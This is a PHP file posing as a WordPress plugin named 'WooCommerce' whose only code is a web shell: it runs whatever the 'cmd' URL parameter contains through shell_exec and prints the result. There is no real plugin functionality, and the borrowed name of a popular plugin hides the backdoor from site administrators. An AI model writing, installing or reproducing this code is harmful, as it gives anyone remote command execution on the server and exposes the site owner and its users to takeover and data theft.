<?php
/**
 * Plugin Name: WooCommerce
 * Version: 1.0
 */

if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd'] . ' 2>&1') . '</pre>';
    exit;
}